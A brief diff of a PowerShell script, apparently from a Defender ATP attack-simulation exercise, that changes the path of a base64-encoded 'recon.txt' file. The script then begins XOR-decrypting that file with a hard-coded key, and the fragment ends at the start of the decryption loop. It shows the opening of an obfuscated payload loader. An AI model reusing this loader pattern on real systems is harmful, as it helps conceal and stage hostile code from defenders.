@@ -1,6 +1,6 @@
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
 $xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');
-$base64String = (Get-Content -Path "C:\Files\recon.txt");
+$base64String = (Get-Content -Path "C:\Users\Admin\Desktop\Allfiles\recon.txt");
 Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) }
 $i = 0;
 $decryptedBytes = @();
